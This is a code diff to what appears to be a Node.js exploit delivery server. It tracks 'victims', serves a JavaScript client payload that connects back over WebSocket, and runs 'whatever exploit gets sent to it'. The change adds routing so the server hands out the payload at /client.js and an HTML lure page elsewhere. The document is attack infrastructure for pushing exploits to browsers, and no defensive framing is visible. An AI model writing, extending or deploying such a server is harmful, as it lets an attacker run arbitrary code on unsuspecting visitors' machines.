@@ -1,9 +1,11 @@
+const fs = require('fs')
 const http = require('http')
+const url = require('url')
 const ws = require('ws')
 
 const config = require('./config')
-const client = require('./client')
-let exploits = require('./exploits') // Not const for dynamic exploit adding
+const client = require('./client/client')
+let exploits = require('./exploits/exploits') // Not const for dynamic exploit adding
 
 const victims = {} // Map of victim name to victim connection
 
@@ -126,11 +128,17 @@ function main() {
     // The client then executes whatever exploit gets sent to it
     const CLIENT_PORT = config.client_port || 8080
     http.createServer((req, res) => {
-        const HOST = config.host || 'localhost'
-        const server_url = '"ws://' + HOST + ':' + EXPLOIT_PORT + '"'
-        let client_payload = '(' + client + ')()'
-        client_payload = client_payload.replace('$$SERVER_URL$$', server_url)
-        res.end(client_payload)
+        const req_path = url.parse(req.url).pathname
+        if('/client.js' === req_path) {
+            const host = config.host || 'localhost'
+            const server_url = '"ws://' + host + ':' + EXPLOIT_PORT + '"'
+            let client_payload = '(' + client + ')()'
+            client_payload = client_payload.replace('$$SERVER_URL$$', server_url)
+            res.end(client_payload)
+        } else {
+            const html_client = fs.readFileSync('./client/index.html')
+            res.end(html_client)
+        }
     }).listen(CLIENT_PORT)
     console.log('Payload server running on port ' + CLIENT_PORT)
 }
